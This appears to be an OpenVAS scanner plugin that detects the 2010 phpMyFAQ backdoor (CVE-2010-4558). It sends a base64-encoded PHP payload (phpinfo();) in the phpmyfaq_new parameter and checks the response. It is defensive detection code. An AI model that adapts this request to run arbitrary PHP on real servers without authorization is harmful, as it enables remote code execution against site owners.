###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmyfaq_45442.nasl 7218 2017-09-21 10:07:18Z ckuersteiner $
#
# phpMyFAQ Backdoor Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:phpmyfaq:phpmyfaq';

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100948");
 script_version("$Revision: 7218 $");
 script_tag(name:"last_modification", value:"$Date: 2017-09-21 12:07:18 +0200 (Thu, 21 Sep 2017) $");
 script_tag(name:"creation_date", value:"2010-12-20 20:02:52 +0100 (Mon, 20 Dec 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_cve_id("CVE-2010-4558");
 script_bugtraq_id(45442);

 script_name("phpMyFAQ Backdoor Unauthorized Access Vulnerability");

 script_xref(name: "URL", value: "https://www.securityfocus.com/bid/45442");
 script_xref(name: "URL", value: "http://www.phpmyfaq.de/");
 script_xref(name: "URL", value: "http://www.phpmyfaq.de/advisory_2010-12-15.php");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("phpmyfaq_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("phpmyfaq/installed");

 script_tag(name: "solution", value: "Updates are available; please see the references for more information.");

 script_tag(name: "summary", value: "phpMyFAQ is prone to an unauthorized-access vulnerability due to a backdoor
in certain versions of the application.

Successful exploits allow remote attackers to execute arbitrary PHP code in the context of the affected
application.

phpMyFAQ 2.6.11 and 2.6.12 obtained between December 4, 1010, and December 15, 2010 are vulnerable.");

 exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir +  "/index.php?phpmyfaq_new=cGhwaW5mbygpOwo="; 

if (http_vuln_check(port: port, url: url, pattern: "<title>phpinfo", extra_check: make_list("PHP Core"))) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);

